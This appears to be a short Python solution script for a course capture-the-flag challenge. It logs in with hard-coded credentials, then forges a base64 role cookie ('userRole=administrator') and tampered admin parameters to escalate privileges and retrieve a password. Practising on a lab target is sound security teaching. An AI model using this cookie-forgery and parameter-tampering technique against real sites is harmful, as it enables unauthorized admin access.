import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a"

postData = {"adminDetected":"true","returnPassword": "true",
            "upgradeUserToAdmin":"true"}
cookieData = {"checksum":"dXNlclJvbGU9YWRtaW5pc3RyYXRvcg=="}
response2 = session.post(targetUrl, data=postData, cookies=cookieData)
print(response2.text)
